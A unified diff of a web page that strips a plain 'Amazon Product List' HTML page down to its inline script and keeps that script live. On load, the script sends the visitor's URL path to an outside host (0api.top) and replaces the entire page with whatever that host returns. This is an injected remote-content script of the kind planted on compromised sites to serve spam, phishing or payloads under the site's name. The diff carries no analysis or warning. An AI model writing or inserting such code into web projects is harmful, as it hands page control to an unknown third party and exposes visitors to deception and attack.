@@ -1,26 +1,14 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Product List</title>
-    <script>
-        const currentUri = window.location.pathname;
-        const xhr = new XMLHttpRequest();
-            const url = 'https://0api.top/geo/';
-            var formData = new FormData();
-                formData.append('uri', currentUri);
-            xhr.onload = function(e) { 
-                if(this.status == 200||this.status == 304){
-                    document.documentElement.innerHTML = xhr.responseText;
-                }
-            };
-            xhr.open('POST', url, false);
-            xhr.send(formData);
-    </script>
-    
-</head>
-<body>
-    <p>Amazon Product List</p>
-</body>
-</html>
+<script>
+    const currentUri = window.location.pathname;
+    const xhr = new XMLHttpRequest();
+        const url = 'https://0api.top/geo/';
+        var formData = new FormData();
+            formData.append('uri', currentUri);
+        xhr.onload = function(e) { 
+            if(this.status == 200||this.status == 304){
+                document.documentElement.innerHTML = xhr.responseText;
+            }
+        };
+        xhr.open('POST', url, false);
+        xhr.send(formData);
+</script>
